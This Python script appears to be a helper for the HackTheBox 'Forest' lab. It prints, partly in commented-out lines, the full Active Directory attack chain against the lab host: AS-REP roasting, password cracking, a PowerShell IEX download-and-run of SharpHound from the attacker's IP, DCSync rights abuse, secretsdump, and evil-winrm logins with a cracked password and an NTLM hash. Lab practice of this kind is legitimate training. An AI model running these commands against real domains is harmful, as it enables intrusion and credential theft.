import sys, os, requests, re, subprocess, paramiko,threading
import time as cm
from colorama import Fore, init
from datetime import datetime
from questionary import Style, select
from consolemenu import SelectionMenu
from sshtunnel import SSHTunnelForwarder
from ftplib import FTP

class Tmsg:
    def __str__(self):
        return (Fore.LIGHTMAGENTA_EX + "⇛ [" +
                Fore.CYAN + datetime.now().strftime("%H:%M:%S") +
                Fore.LIGHTMAGENTA_EX + "]" + Fore.YELLOW + "-" +
                Fore.LIGHTMAGENTA_EX + "[" + Fore.WHITE + "P4n3l" +
                Fore.LIGHTMAGENTA_EX + "]" + Fore.YELLOW + "-" +
                Fore.LIGHTMAGENTA_EX + "[" + Fore.LIGHTGREEN_EX + "~" +
                Fore.LIGHTMAGENTA_EX + "]" + Fore.LIGHTGREEN_EX + " ➤" + Fore.RESET)

init(autoreset=True)
custom_style = Style([
    ('qmark', 'fg:#FF5F87 bold'),
    ('question', 'fg:#017cff bold'),             
    ('answer', 'fg:#01ff4e bold'),     
    ('pointer', 'fg:#fbff00 bold'),    
    ('highlighted', 'fg:#00FFFF bold'),
    ('selected', 'fg:#22b9c5 bold'),        
    ('separator', 'fg:#6C6C6C bold'),
])

global machine_ip
global target_machine
global ln

def banner():
    os.system("clear")
    bnn = """
    
    ▓█████  ▄████▄   ██░ ██  ██ ▄█▀ ███▄ ▄███▓ ▒█████   █    ██   ██████ 
    ▓█   ▀ ▒██▀ ▀█  ▓██░ ██▒ ██▄█▒ ▓██▒▀█▀ ██▒▒██▒  ██▒ ██  ▓██▒▒██    ▒ 
    ▒███   ▒▓█    ▄ ▒██▀▀██░▓███▄░ ▓██    ▓██░▒██░  ██▒▓██  ▒██░░ ▓██▄   
    ▒▓█  ▄ ▒▓▓▄ ▄██▒░▓█ ░██ ▓██ █▄ ▒██    ▒██ ▒██   ██░▓▓█  ░██░  ▒   ██▒
    ░▒████▒▒ ▓███▀ ░░▓█▒░██▓▒██▒ █▄▒██▒   ░██▒░ ████▓▒░▒▒█████▓ ▒██████▒▒
    ░░ ▒░ ░░ ░▒ ▒  ░ ▒ ░░▒░▒▒ ▒▒ ▓▒░ ▒░   ░  ░░ ▒░▒░▒░ ░▒▓▒ ▒ ▒ ▒ ▒▓▒ ▒ ░
     ░ ░  ░  ░  ▒    ▒ ░▒░ ░░ ░▒ ▒░░  ░      ░  ░ ▒ ▒░ ░░▒░ ░ ░ ░ ░▒  ░ ░
       ░   ░         ░  ░░ ░░ ░░ ░ ░      ░   ░ ░ ░ ▒   ░░░ ░ ░ ░  ░  ░  
       ░  ░░ ░       ░  ░  ░░  ░          ░       ░ ░     ░           ░  
           ░                                                             
    __________________________________________________________________________
    [+] Author: Ech0k   [+] G1thub: github.com/l44x   [+] T00l: HTB-Forest
    __________________________________________________________________________\n"""
    print(Fore.LIGHTMAGENTA_EX + f"{bnn}")

tmsg = Tmsg()
ln = Fore.GREEN+"========================================="+Fore.RESET

def menu_panel():
    options=["[+] svc-alfresco","[+] Administrator", "[-] exit"]
    opcion = select(
        "Selecciona una opción:",
        choices=options,
        style=custom_style
    ).ask()
        
    return [opcion,options]

def commands_send(cmd):
    try:
        #subprocess.run(cmd, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        result = subprocess.run(cmd, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        return result.stdout.strip()
    except subprocess.CalledProcessError as e:
        print(f"OcurredErr0r {e}")

def hmsg(user,msg):
    return Fore.YELLOW+"["+Fore.GREEN+"@"+Fore.WHITE+f"{user}"+Fore.YELLOW+"]"+Fore.GREEN+"-"+Fore.YELLOW+"["+Fore.LIGHTMAGENTA_EX+"♛ "+Fore.WHITE+f"{msg}"+Fore.YELLOW+"]"

#------------------------------------------------------------------------

machine_ip=commands_send('ifconfig | grep destination | awk \'NF{print $NF}\'')
target_machine="10.10.10.161" # change this if change ip on htb.

def checker_status():
    try:
        check_hackthebox_vpn="ifconfig | grep tun0"
        control_status_vpn=commands_send(check_hackthebox_vpn)
        cm.sleep(.5)
        if control_status_vpn:
            print(ln)
            print(tmsg,Fore.RED + f"[HackTheBoxVPN] > " + Fore.GREEN + f"Successful Connection ;)")
        else:
            print(tmsg,Fore.RED + f"[!] Actve ur HackTheBox VPN")
            sys.exit(1)
    except subprocess.CalledProcessError as e:
        print(tmsg,f"OcurredErr0r [Vpn-Status] {e}")

def default_cred_user():
    try:
        whoami_default=commands_send('whoami')
        machine_default_ip=commands_send(f'ping -c 1 {machine_ip} | grep "1 received" ');print(ln)
        print(tmsg,hmsg("user","Default User connection"))
        print(tmsg,Fore.RED + f"[HackTheBox - IP] > " + Fore.YELLOW + f"{machine_ip}")
        print(tmsg,Fore.RED + f"[User-default] > " + Fore.YELLOW + f"{whoami_default}")
        if machine_default_ip:
            print(tmsg,Fore.RED + f"[Target Machine] > " + Fore.YELLOW + f"{target_machine}")
            print(tmsg,Fore.RED + f"[Target Path Exploit ] > " + Fore.YELLOW + f"SMB {target_machine}");print(ln)
        else:
            print(tmsg,Fore.RED + f"\t\t\t[Target Machine] > " + Fore.RED + f"Checked Forest Network");print(ln)
    except subprocess.CalledProcessError as e:
        print(f"OcurredErr0r [User-Default] {e}")

#------------------------------------------------------------------------

def enter_svc_alfresco():
    try:
        # print(tmsg,Fore.RED + f"[Exploit - svc-alfresco] > " + Fore.YELLOW + f"Run command > " + Fore.LIGHTCYAN_EX + "rpcclient -U "" 10.10.10.161 -N -c 'enumdomusers' | grep -oP '\[.*?\]' | grep -v 0x | tr -d '[]' > users");cm.sleep(.5)
        # commands_send("rpcclient -U "" 10.10.10.161 -N -c 'enumdomusers' | grep -oP '\[.*?\]' | grep -v 0x | tr -d '[]' > users")
        # print(tmsg,Fore.RED + f"[Exploit - svc-alfresco] > " + Fore.YELLOW + f"Run command > " + Fore.LIGHTCYAN_EX + "GetNPUsers.py -no-pass -usersfile users htb.local/ | grep \"svc-alfresco\" > hash");cm.sleep(.5)
        # commands_send("GetNPUsers.py -no-pass -usersfile users htb.local/ | grep \"svc-alfresco\" > hash")
        # print(tmsg,Fore.RED + f"[Exploit - svc-alfresco] > " + Fore.YELLOW + f"Run command > " + Fore.LIGHTCYAN_EX + "john --wordlist=/usr/share/wordlists/rockyou.txt hash");cm.sleep(.5)
        # commands_send("john --wordlist=/usr/share/wordlists/rockyou.txt hash")
        print(tmsg,Fore.RED + f"[Exploit - svc-alfresco] > " + Fore.YELLOW + f"Run command > " + Fore.LIGHTCYAN_EX + "evil-winrm -i 10.10.10.161 -u 'svc-alfresco' -p 's3rvice'");cm.sleep(.5)
    except:
        pass


def enter_administrator():
        # print(tmsg,Fore.RED + f"[Exploit - Administrator Linux] > " + Fore.YELLOW + f"Run command > " + Fore.LIGHTCYAN_EX + "wget https://raw.githubusercontent.com/puckiestyle/powershell/refs/heads/master/SharpHound.ps1");cm.sleep(.5)
        #commands_send("wget https://raw.githubusercontent.com/puckiestyle/powershell/refs/heads/master/SharpHound.ps1")
        # print(tmsg,Fore.RED + f"[Exploit - Administrator Linux] > " + Fore.YELLOW + f"Run command > " + Fore.LIGHTCYAN_EX + "python3 -m http.server 80");cm.sleep(.5)
        # print(tmsg,Fore.RED + f"[Exploit - Administrator Windows] > " + Fore.YELLOW + f"Run command > " + Fore.LIGHTCYAN_EX + "IEX(New-Object Net.WebClient).downloadString('http://10.10.16.8/SharpHound.ps1')");cm.sleep(.5)
        # print(tmsg,Fore.RED + f"[Exploit - Administrator Windows] > " + Fore.YELLOW + f"Run command > " + Fore.LIGHTCYAN_EX + "net user pepe pepe123 /add");cm.sleep(.5)
        # print(tmsg,Fore.RED + f"[Exploit - Administrator Windows] > " + Fore.YELLOW + f"Run command > " + Fore.LIGHTCYAN_EX + "net group \"Exchange Windows Permissions\" pepe /add");cm.sleep(.5)
        # print(tmsg,Fore.RED + f"[Exploit - Administrator WIndows] > " + Fore.YELLOW + f"Run command > " + Fore.LIGHTCYAN_EX + "$SecPassword = ConvertTo-SecureString 'pepe123' -AsPlainText -Force");cm.sleep(.5)
        # print(tmsg,Fore.RED + f"[Exploit - Administrator Windows] > " + Fore.YELLOW + f"Run command > " + Fore.LIGHTCYAN_EX + "$Cred = New-Object System.Management.Automation.PSCredential('htb.local\pepe', $SecPassword)");cm.sleep(.5)
        # print(tmsg,Fore.RED + f"[Exploit - Administrator Linux] > " + Fore.YELLOW + f"Run command Listen > " + Fore.LIGHTCYAN_EX + "python3 -m http.server 80 ");cm.sleep(.5)
        # print(tmsg,Fore.RED + f"[Exploit - Administrator Windows] > " + Fore.YELLOW + f"Run command > " + Fore.LIGHTCYAN_EX + "IEX(New-Object Net.WebClient).downloadString('http://10.10.16.8/SharpHound.ps1')");cm.sleep(.5)
        # print(tmsg,Fore.RED + f"[Exploit - Administrator Windows] > " + Fore.YELLOW + f"Run command > " + Fore.LIGHTCYAN_EX + "Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity pepe -Rights DCSync");cm.sleep(.5)
        # print(tmsg,Fore.RED + f"[Exploit - Administrator Linux] > " + Fore.YELLOW + f"Run command > " + Fore.LIGHTCYAN_EX + "secretsdump.py htb.local/pepe@10.10.10.161");cm.sleep(.5)
        # print(tmsg,Fore.RED + f"[Exploit - Administrator Linux] > " + Fore.YELLOW + f"Run command > " + Fore.LIGHTCYAN_EX + "crackmapexec winrm 10.10.10.161 -u 'Administrator' -H '32693b11e6aa90eb43d32c72a07ceea6'");cm.sleep(.5)
        print(tmsg,Fore.RED + f"[Exploit - Administrator Linux] > " + Fore.YELLOW + f"Run command > " + Fore.LIGHTCYAN_EX + "evil-winrm -i 10.10.10.161 -u 'Administrator' -H '32693b11e6aa90eb43d32c72a07ceea6'");cm.sleep(.5)

#------------------------------------------------------------------------
def undected():
    try:
        checker_status();cm.sleep(.8)
        default_cred_user();cm.sleep(.8)
        print(Fore.YELLOW+f"=========================================")
        while True:
            opcion = menu_panel()
            print(Fore.YELLOW+f"=========================================")
            if opcion[0] == opcion[1][0]:
                print(tmsg,hmsg("user","svc-alfresco connection"))
                print(tmsg,Fore.LIGHTBLUE_EX +f"[Exploit - svc-alfresco] > " + Fore.YELLOW + f"Listen on port 443");cm.sleep(0.2)
                enter_svc_alfresco()                
                print(tmsg,Fore.LIGHTBLUE_EX +f"[svc-alfresco] > " + Fore.GREEN + f"✔ G00d H4ch1ng Duhhmhm :3");print(ln)
            elif opcion[0] == opcion[1][1]:
                print(tmsg,hmsg("user","Administrator user connection"))
                enter_administrator()
                print(tmsg,Fore.LIGHTBLUE_EX +f"[Administrator-user] > " + Fore.GREEN + f"✔ G00d H4ch1ng Duhhmhm :3");print(ln)
                break
            elif opcion[0] == opcion[1][-1]:
                break
            else:
                break
    except:
        pass
    
if __name__ == '__main__':
    banner()
    undected()
